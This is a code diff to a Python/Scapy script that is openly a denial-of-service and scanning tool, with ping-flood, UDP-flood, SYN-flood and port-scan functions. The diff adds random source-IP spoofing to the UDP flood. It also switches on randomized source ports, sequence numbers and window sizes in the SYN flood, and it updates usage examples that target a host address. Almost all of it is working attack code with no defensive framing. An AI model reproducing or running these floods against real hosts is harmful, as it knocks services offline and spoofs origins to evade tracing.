@@ -127,14 +127,6 @@ def ICMP_Ping_Flood(host, cmds):
 		print('something went wrong in ping flood ', e)
 		print('host and number of pings set: ', cmds)
 
-def randomIP():
-	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
-	return ip
-
-def randInt():
-	x = random.randint(0, 255)
-	return x
-	
 def upd_attack(host, cmds):
 	""" 
 	sends UDP packets to host on port of amount
@@ -147,7 +139,10 @@ def upd_attack(host, cmds):
 		except IndexError as i:
 			amount = 1
 		for i in range(0, amount):
-			send(IP(dst=host)/UDP(dport=port))
+			IP_Packet = IP()
+			IP_Packet.src = randomIP()
+			IP_Packet.dst = host
+			send(IP_Packet/UDP(dport=port))
 		print("sent %s UDP Packets" % amount)
 		print("UDP Packet details:")
 		udp = UDP(dport=port)
@@ -155,6 +150,17 @@ def upd_attack(host, cmds):
 	except Exception as e:
 		print('something went wrong in udp_attack ', e)
 		print('cmds: ', cmds)
+		
+def randomIP():
+	"""
+	Allows for src IP spoofing
+	"""
+	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
+	return ip
+
+def randInt():
+	x = random.randint(0, 255)
+	return x
 
 def SynAckAttack(host, cmds):
 	"""
@@ -189,20 +195,20 @@ def SynAckAttack(host, cmds):
 		for hostPort in ports:
 			for x in range(0, amount):
 				# Build a random packet
-				# s_port = randInt()
-				# s_eq = randInt()
-				# w_indow = randInt()
+				s_port = randInt()
+				s_eq = randInt()
+				w_indow = randInt()
 
 				IP_Packet = IP()
 				IP_Packet.src = randomIP()
 				IP_Packet.dst = host
 
 				TCP_Packet = TCP()
-				# TCP_Packet.sport = s_port
+				TCP_Packet.sport = s_port
 				TCP_Packet.dport = hostPort
 				TCP_Packet.flags = "S"
-				# TCP_Packet.seq = s_eq
-				# TCP_Packet.window = w_indow
+				TCP_Packet.seq = s_eq
+				TCP_Packet.window = w_indow
 
 				# Send the packet
 				send(IP_Packet/TCP_Packet)
@@ -334,13 +340,11 @@ def usage(print_code_name=True):
 	print()
 	print()
 	print("Examples: ")
-
 	print("-l")
-	print("-s   192.168.0.1 0 500        # host, port range")
-	print("-pf  192.168.0.1  100         # host, num of pings (optional) <num of pings>")
-	print("-syn 192.168.0.1  80,8080 100 # host, ports comma delimited, and amount (optional)")
+	print("-s   192.168.0.1  0 500       # host, port range (space delimited)")
+	print("-pf  192.168.0.1  100         # host, num of pings (optional, defaults to 1)")
+	print("-syn 192.168.0.1  80,8080 100 # host, ports (comma delimited), and amount (optional)")
 	print("-udp 192.168.0.1  80 100      # host, port, amount (optional, defaults to 1)")
-	# sys.exit(0)
 
 
 if __name__ == "__main__":
